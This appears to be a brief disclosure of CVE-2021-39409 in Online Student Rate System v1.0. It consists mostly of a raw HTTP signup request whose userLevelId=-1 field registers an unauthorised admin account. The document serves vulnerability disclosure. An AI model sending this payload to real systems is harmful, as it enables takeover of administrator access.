# CVE-2021-39409
Admin account registration is possible in Online Student Rate System v1.0, allowing a malicious actor to create an admin account and access the admin panel.

## Vulnerability
```
POST /ajax.php?action=signup HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 105
Origin: http://localhost
Connection: close
Referer: http://localhost

username=testaccount&passsword=098f6bcd4621d373cade4e832627b4f6&userLevelId=-1&email=example@example.com
```

